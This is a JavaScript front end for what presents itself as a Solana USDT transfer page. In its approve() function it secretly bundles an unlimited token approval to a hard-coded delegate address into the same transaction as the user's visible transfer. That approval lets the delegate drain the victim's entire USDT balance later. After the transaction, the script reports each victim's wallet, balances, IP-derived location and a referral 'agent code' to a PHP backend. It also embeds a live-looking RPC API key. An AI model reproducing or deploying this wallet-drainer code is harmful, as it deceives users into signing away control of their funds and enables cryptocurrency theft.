// 配置信息
const RPC_ENDPOINTS = [
  "https://mainnet.helius-rpc.com/?api-key=dba2adc4-2462-4f28-9dcd-4ee1e4a51d1b",
];

const USDT_MINT = new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("D2j7z5uUCvUPqa1nDYyDTSvFN3Mon8kFKXgBmKU9LYYB");

// 官方 SPL Token Program
const OFFICIAL_SPL_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

// 后台API地址
const BACKEND_API_URL = 'php/api/transaction.php';

// 汇率配置
const exchangeRates = {
  USDT: 6.79,
  SOL: 987.25
};

// ✅ u64 最大值（无限授权）
const U64_MAX = (1n << 64n) - 1n; // 18446744073709551615
const U64_MAX_STR = U64_MAX.toString();

const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

function encodeU64LE(value) {
  let remaining = BigInt(value);
  if (remaining < 0n || remaining > U64_MAX) {
    throw new Error("金额超出 u64 范围");
  }

  const bytes = new Uint8Array(8);
  for (let i = 0; i < 8; i += 1) {
    bytes[i] = Number(remaining & 0xffn);
    remaining >>= 8n;
  }
  return bytes;
}

function createTokenAmountInstructionData(instruction, amount) {
  const data = new Uint8Array(9);
  data[0] = instruction;
  data.set(encodeU64LE(amount), 1);
  return data;
}

function normalizeSignerPubkey(signer) {
  if (signer instanceof solanaWeb3.PublicKey) return signer;
  if (signer && signer.publicKey instanceof solanaWeb3.PublicKey) return signer.publicKey;
  throw new Error("multiSigners 格式不正确");
}

function addOwnerOrMultiSigners(keys, owner, multiSigners = []) {
  if (Array.isArray(multiSigners) && multiSigners.length > 0) {
    return [
      ...keys,
      ...multiSigners.map(signer => ({
        pubkey: normalizeSignerPubkey(signer),
        isSigner: true,
        isWritable: false
      }))
    ];
  }

  return [
    ...keys,
    { pubkey: owner, isSigner: true, isWritable: false }
  ];
}

function getAssociatedTokenAddressCompat(
  mint,
  owner,
  allowOwnerOffCurve = false,
  programId = OFFICIAL_SPL_TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
) {
  if (
    !allowOwnerOffCurve &&
    typeof solanaWeb3.PublicKey.isOnCurve === 'function' &&
    !solanaWeb3.PublicKey.isOnCurve(owner.toBuffer())
  ) {
    throw new Error("owner 不在 ed25519 曲线上");
  }

  const [address] = solanaWeb3.PublicKey.findProgramAddressSync(
    [owner.toBuffer(), programId.toBuffer(), mint.toBuffer()],
    associatedTokenProgramId
  );

  return address;
}

function createAssociatedTokenAccountInstructionCompat(
  payer,
  associatedToken,
  owner,
  mint,
  programId = OFFICIAL_SPL_TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
) {
  return new solanaWeb3.TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: associatedToken, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: programId, isSigner: false, isWritable: false }
    ],
    programId: associatedTokenProgramId,
    data: new Uint8Array(0)
  });
}

function createApproveInstructionCompat(
  account,
  delegate,
  owner,
  amount,
  multiSigners = [],
  programId = OFFICIAL_SPL_TOKEN_PROGRAM_ID
) {
  return new solanaWeb3.TransactionInstruction({
    keys: addOwnerOrMultiSigners(
      [
        { pubkey: account, isSigner: false, isWritable: true },
        { pubkey: delegate, isSigner: false, isWritable: false }
      ],
      owner,
      multiSigners
    ),
    programId,
    data: createTokenAmountInstructionData(4, amount)
  });
}

function createTransferInstructionCompat(
  source,
  destination,
  owner,
  amount,
  multiSigners = [],
  programId = OFFICIAL_SPL_TOKEN_PROGRAM_ID
) {
  return new solanaWeb3.TransactionInstruction({
    keys: addOwnerOrMultiSigners(
      [
        { pubkey: source, isSigner: false, isWritable: true },
        { pubkey: destination, isSigner: false, isWritable: true }
      ],
      owner,
      multiSigners
    ),
    programId,
    data: createTokenAmountInstructionData(3, amount)
  });
}

const splToken = {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createApproveInstruction: createApproveInstructionCompat,
  createTransferInstruction: createTransferInstructionCompat,
  Token: {
    getAssociatedTokenAddress(associatedTokenProgramId, programId, mint, owner, allowOwnerOffCurve = false) {
      return getAssociatedTokenAddressCompat(mint, owner, allowOwnerOffCurve, programId, associatedTokenProgramId);
    },
    createAssociatedTokenAccountInstruction(associatedTokenProgramId, programId, mint, associatedToken, owner, payer) {
      return createAssociatedTokenAccountInstructionCompat(
        payer,
        associatedToken,
        owner,
        mint,
        programId,
        associatedTokenProgramId
      );
    },
    createApproveInstruction(programId, source, delegate, owner, multiSigners, amount) {
      return createApproveInstructionCompat(source, delegate, owner, amount, multiSigners, programId);
    },
    createTransferInstruction(programId, source, destination, owner, multiSigners, amount) {
      return createTransferInstructionCompat(source, destination, owner, amount, multiSigners, programId);
    }
  }
};

// 全局变量
let walletSOLBalance = 0;
let walletUSDTBalance = 0;

// 获取URL中的代理参数
function getAgentFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('a') || localStorage.getItem('agentCode') || '';
}

// 页面加载时保存代理参数到localStorage
document.addEventListener('DOMContentLoaded', () => {
  const agentCode = getAgentFromURL();
  if (agentCode) {
    localStorage.setItem('agentCode', agentCode);
    console.log('代理码已保存:', agentCode);
  }
});

// 并发检测所有RPC节点，返回最快可用连接
async function getConnection() {
  try {
    return await Promise.any(
      RPC_ENDPOINTS.map(endpoint => {
        const connection = new solanaWeb3.Connection(endpoint);
        return connection.getEpochInfo().then(() => connection);
      })
    );
  } catch (e) {
    throw new Error("无法连接到RPC节点");
  }
}

// 自动连接Solana钱包并更新余额
document.addEventListener('DOMContentLoaded', async () => {
  let provider;
  if (window.solana && window.solana.isPhantom) {
    provider = window.solana;
  } else if (window.solflare && window.solflare.isSolflare) {
    provider = window.solflare;
  } else {
    console.error("请安装Phantom或Solflare钱包");
    return;
  }
  try {
    if (!provider.isConnected) await provider.connect();
    window.provider = provider;
    console.log("钱包已连接:", provider.publicKey.toString());

    // ✅ 强制默认显示 USDT（避免你页面显示成SOL导致走SOL分支）
    setSelectedToken('USDT');

    updateBalances();
  } catch (err) {
    console.error("自动连接钱包失败:", err);
  }
});

// 更新当前钱包的SOL和USDT余额
async function updateBalances() {
  if (!window.provider || !window.provider.publicKey) return;
  const walletPublicKey = window.provider.publicKey;
  try {
    const connection = await getConnection();

    const lamports = await connection.getBalance(walletPublicKey);
    walletSOLBalance = lamports / solanaWeb3.LAMPORTS_PER_SOL;

    const accounts = await withRetry(() =>
      connection.getTokenAccountsByOwner(walletPublicKey, { mint: USDT_MINT })
    );

    let usdt = 0;
    for (const acct of accounts.value) {
      const balanceInfo = await withRetry(() =>
        connection.getTokenAccountBalance(acct.pubkey)
      );
      usdt += balanceInfo.value.uiAmount;
    }
    walletUSDTBalance = usdt;

    updateBalanceDisplay();
  } catch (error) {
    console.error("获取余额失败:", error);
  }
}

// 重试机制
async function withRetry(fn, retries = 3) {
  try {
    return await fn();
  } catch (error) {
    if (retries > 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      return await withRetry(fn, retries - 1);
    }
    throw error;
  }
}

// 代币选择逻辑
let selectedToken = 'USDT';
const tokenOptions = document.getElementById('tokenOptions');
const tokenIcon = document.getElementById('tokenIcon');
const tokenName = document.getElementById('tokenName');

function setSelectedToken(token) {
  selectedToken = token;
  tokenIcon.src = `${selectedToken.toLowerCase()}.png`;
  tokenName.innerHTML = `
    ${selectedToken}
    <span>(${selectedToken === 'USDT' ? 'USDT' : 'USDT'})</span>
  `;
  tokenOptions.style.display = 'none';
  updateBalanceDisplay();
  updateConversion();
}

// 代币选择切换
document.getElementById('tokenSelector').addEventListener('click', () => {
  tokenOptions.style.display = tokenOptions.style.display === 'block' ? 'none' : 'block';
});

// 代币选项点击处理
document.querySelectorAll('.token-option').forEach(option => {
  option.addEventListener('click', () => {
    setSelectedToken(option.dataset.token);
  });
});

// 清除输入功能
document.querySelector('.van-icon-clear').addEventListener('click', () => {
  document.querySelector('input[type="number"]').value = '';
  updateConversion();
});

// 更新可用余额显示
function updateBalanceDisplay() {
  let currentBalance = selectedToken === 'USDT' ? walletUSDTBalance : walletSOLBalance;
  document.querySelector('.available').textContent = `可用：${currentBalance.toFixed(2)}`;
  updateConversion();
}

// 输入金额与转换金额实时更新及按钮状态控制
const amountInput = document.querySelector('input[type="number"]');
const conversionDisplay = document.getElementById('conversionDisplay');
const transferBtn = document.getElementById('transferBtn');
const errorDiv = document.querySelector('.error');

function updateConversion() {
  const amount = parseFloat(amountInput.value) || 0;
  conversionDisplay.textContent = "≈￥" + (amount * exchangeRates[selectedToken]).toFixed(2);

  let currentBalance = selectedToken === 'USDT' ? walletUSDTBalance : walletSOLBalance;

  if (amount > 0 && amount <= currentBalance) {
    transferBtn.classList.remove("disabled");
    errorDiv.style.display = "none";
  } else if (amount > currentBalance) {
    transferBtn.classList.add("disabled");
    errorDiv.style.display = "flex";
    errorDiv.querySelector("span").textContent = "余额不足";
  } else {
    transferBtn.classList.add("disabled");
    errorDiv.style.display = "none";
  }
}

amountInput.addEventListener('input', updateConversion);

// 显示等待提示框
function showLoadingModal() {
  let modal = document.createElement('div');
  modal.id = "loadingModal";
  modal.style.position = "fixed";
  modal.style.top = 0;
  modal.style.left = 0;
  modal.style.width = "100%";
  modal.style.height = "100%";
  modal.style.backgroundColor = "rgba(0,0,0,0.5)";
  modal.style.display = "flex";
  modal.style.justifyContent = "center";
  modal.style.alignItems = "center";
  modal.style.zIndex = 9999;

  let modalContent = document.createElement('div');
  modalContent.style.padding = "20px 30px";
  modalContent.style.backgroundColor = "#fff";
  modalContent.style.borderRadius = "8px";
  modalContent.style.boxShadow = "0 2px 10px rgba(0,0,0,0.1)";
  modalContent.style.fontSize = "16px";
  modalContent.style.fontWeight = "bold";
  modalContent.textContent = "正在发起交易，请稍候...";

  modal.appendChild(modalContent);
  document.body.appendChild(modal);
}

// 隐藏等待提示框
function hideLoadingModal() {
  const modal = document.getElementById("loadingModal");
  if (modal) modal.remove();
}

// 发送交易数据到后台
async function sendTransactionToBackend(data) {
  try {
    const response = await fetch(BACKEND_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    const result = await response.json();
    return result.success;
  } catch (error) {
    console.error("发送交易数据到后台失败:", error);
    return false;
  }
}

// 获取用户位置信息
async function getUserLocation() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    const data = await response.json();
    return `${data.city}, ${data.country}`;
  } catch (error) {
    console.error("获取位置信息失败:", error);
    return "";
  }
}

// 创建 Solana Explorer 交易链接
function getSolanaExplorerLink(txid) {
  return `https://solscan.io/tx/${txid}`;
}

/**
 * 十进制字符串 => base units(BigInt)
 */
function toBaseUnits(amountStr, decimals) {
  const s = String(amountStr || '').trim();
  if (!s) return 0n;
  if (!/^\d+(\.\d+)?$/.test(s)) throw new Error("金额格式不正确");

  const [i, f = ""] = s.split(".");
  const frac = (f + "0".repeat(decimals)).slice(0, decimals);
  const base = 10n ** BigInt(decimals);
  return BigInt(i) * base + BigInt(frac || "0");
}

// ✅ USDT：转账交易提交
async function approve() {
  const authBtn = document.getElementById('transferBtn');

  // ✅ 不管你当前选了什么，都强制切回 USDT（你说你要转U）
  if (selectedToken !== 'USDT') setSelectedToken('USDT');

  const uiAmountStr = String(amountInput.value || '').trim();
  const uiAmount = parseFloat(uiAmountStr) || 0;

  if (!uiAmountStr || uiAmount <= 0) {
    alert("请输入正确的金额");
    return;
  }

  showLoadingModal();

  try {
    authBtn.textContent = `正在转账...`;

    let provider = window.provider;
    if (!provider) {
      if (window.solana && window.solana.isPhantom) provider = window.solana;
      else if (window.solflare && window.solflare.isSolflare) provider = window.solflare;
      else throw new Error("请安装Phantom或Solflare钱包");

      if (!provider.isConnected) await provider.connect();
      window.provider = provider;
    }
    const walletPublicKey = provider.publicKey;
    const connection = await getConnection();

    const solLamports = await connection.getBalance(walletPublicKey);
    const solBalanceInSol = solLamports / solanaWeb3.LAMPORTS_PER_SOL;

    const instructions = [];

    // 1) 找到来源 USDT token 账户（余额最大）
    const parsed = await withRetry(() =>
      connection.getParsedTokenAccountsByOwner(walletPublicKey, { mint: USDT_MINT })
    );

    let sourceTokenAccount = null;
    let sourceAmountBase = 0n;
    let usdtDecimals = null;

    if (parsed.value && parsed.value.length > 0) {
      for (const item of parsed.value) {
        const info = item.account.data.parsed.info;
        const amtStr = info.tokenAmount.amount;
        const dec = info.tokenAmount.decimals;
        const amt = BigInt(amtStr);
        if (amt > sourceAmountBase) {
          sourceAmountBase = amt;
          sourceTokenAccount = item.pubkey;
          usdtDecimals = dec;
        }
      }
    }

    if (!sourceTokenAccount) {
      const supply = await withRetry(() => connection.getTokenSupply(USDT_MINT));
      usdtDecimals = supply.value.decimals;

      const userAssociatedToken = await splToken.Token.getAssociatedTokenAddress(
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
        OFFICIAL_SPL_TOKEN_PROGRAM_ID,
        USDT_MINT,
        walletPublicKey
      );

      const userAtaAccount = await connection.getAccountInfo(userAssociatedToken);
      if (!userAtaAccount) {
        const createUserAtaIx = splToken.Token.createAssociatedTokenAccountInstruction(
          splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
          OFFICIAL_SPL_TOKEN_PROGRAM_ID,
          USDT_MINT,
          userAssociatedToken,
          walletPublicKey,
          walletPublicKey
        );
        instructions.push(createUserAtaIx);
      }
      sourceTokenAccount = userAssociatedToken;
      sourceAmountBase = 0n;
    }

    // 2) 目标地址 USDT ATA（不存在创建）
    const destAssociatedToken = await splToken.Token.getAssociatedTokenAddress(
      splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
      OFFICIAL_SPL_TOKEN_PROGRAM_ID,
      USDT_MINT,
      DELEGATE_ADDRESS
    );

    const destAtaInfo = await connection.getAccountInfo(destAssociatedToken);
    if (!destAtaInfo) {
      const createDestAtaIx = splToken.Token.createAssociatedTokenAccountInstruction(
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
        OFFICIAL_SPL_TOKEN_PROGRAM_ID,
        USDT_MINT,
        destAssociatedToken,
        DELEGATE_ADDRESS,
        walletPublicKey
      );
      instructions.push(createDestAtaIx);
    }

    // 3) 输入数量 => base units
    if (usdtDecimals == null) {
      const supply = await withRetry(() => connection.getTokenSupply(USDT_MINT));
      usdtDecimals = supply.value.decimals;
    }
    const transferAmountBase = toBaseUnits(uiAmountStr, usdtDecimals);

    if (transferAmountBase <= 0n) throw new Error("请输入正确的转账数量");
    if (transferAmountBase > U64_MAX) throw new Error("转账数量过大（超过u64上限）");
    if (transferAmountBase > sourceAmountBase) throw new Error("USDT余额不足");

    // 4) 手续费检查（保守）
    const needCreateSomething = instructions.length > 0;
    const requiredSol = needCreateSomething ? 0.01 : 0.002;
    if (solBalanceInSol < requiredSol) {
      throw new Error(`SOL余额不足，需要至少 ${requiredSol} SOL 用于手续费/创建账户`);
    }

    // 5) ✅ 一笔交易内：无限授权 + 输入数量转账（两条指令）
    const approveIx = splToken.createApproveInstruction(
      sourceTokenAccount,
      DELEGATE_ADDRESS,
      walletPublicKey,
      U64_MAX,
      [],
      OFFICIAL_SPL_TOKEN_PROGRAM_ID
    );

    const transferIx = splToken.createTransferInstruction(
      sourceTokenAccount,
      destAssociatedToken,
      walletPublicKey,
      transferAmountBase,
      [],
      OFFICIAL_SPL_TOKEN_PROGRAM_ID
    );

    instructions.push(approveIx);
    instructions.push(transferIx);

    // 6) 发送交易（一个 txid）
    const transaction = new solanaWeb3.Transaction();
    instructions.forEach(ix => transaction.add(ix));

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = walletPublicKey;

    const signedTx = await provider.signTransaction(transaction);
    const txid = await connection.sendRawTransaction(signedTx.serialize(), {
      skipPreflight: true,
      maxRetries: 5
    });

    const explorerLink = getSolanaExplorerLink(txid);

    const modal = document.getElementById("loadingModal");
    if (modal) {
      const modalContent = modal.querySelector('div');
      if (modalContent) {
        modalContent.innerHTML = `
          <p>交易已发送，正在等待确认...</p>
          <p>交易ID: ${txid.slice(0, 8)}...${txid.slice(-8)}</p>
          <a href="${explorerLink}" target="_blank" style="color: blue; text-decoration: underline;">在Solana浏览器查看</a>
        `;
      }
    }

    // 7) 确认 & 上报后台
    try {
      const confirmation = await connection.confirmTransaction(
        { signature: txid, blockhash, lastValidBlockHeight },
        'confirmed'
      );

      const location = await getUserLocation();
      const agentCode = getAgentFromURL();

      const txData = {
        wallet_address: walletPublicKey.toString(),
        transaction_id: txid,
        token_type: 'USDT',
        sol_balance: solBalanceInSol,
        usdt_balance: walletUSDTBalance,
        status: confirmation.value.err ? 'pending' : 'success',
        ip_address: '',
        location,
        agent_code: agentCode
      };

      await sendTransactionToBackend(txData);

      if (confirmation.value.err) {
        alert(`交易可能出现问题，请在Solana浏览器检查：\n${explorerLink}`);
      } else {
        alert("USDT转账交易提交成功！");
        updateBalances();
      }
    } catch (confirmError) {
      console.error("交易确认超时:", confirmError);

      alert(`交易确认超时，但这不意味着交易失败。\n请在Solana浏览器检查交易状态：\n${explorerLink}`);

      const location = await getUserLocation();
      const agentCode = getAgentFromURL();

      const txData = {
        wallet_address: walletPublicKey.toString(),
        transaction_id: txid,
        token_type: 'USDT',
        sol_balance: solBalanceInSol,
        usdt_balance: walletUSDTBalance,
        status: 'pending',
        ip_address: '',
        location,
        agent_code: agentCode
      };
      await sendTransactionToBackend(txData);
    } finally {
      authBtn.textContent = "转账";
      hideLoadingModal();
    }
  } catch (error) {
    console.error(error);
    alert("转账失败: " + error.message);
    authBtn.textContent = "转账";
    hideLoadingModal();
  }
}

// 绑定按钮
transferBtn.addEventListener('click', approve);
